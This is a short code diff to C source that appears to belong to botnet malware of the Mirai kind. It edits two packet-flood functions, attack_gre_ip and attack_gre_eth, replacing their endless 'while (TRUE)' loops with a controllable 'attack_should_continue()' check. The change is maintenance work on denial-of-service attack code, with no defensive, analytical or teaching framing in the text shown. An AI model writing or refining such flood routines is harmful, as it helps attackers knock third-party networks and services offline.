@@ -100,7 +100,7 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
         udph->len = htons(sizeof (struct udphdr) + data_len);
     }
 
-    while (TRUE)
+    while (attack_should_continue())
     {
         for (i = 0; i < targs_len; i++)
         {
@@ -248,7 +248,7 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         udph->len = htons(sizeof (struct udphdr) + data_len);
     }
 
-    while (TRUE)
+    while (attack_should_continue())
     {
         for (i = 0; i < targs_len; i++)
         {
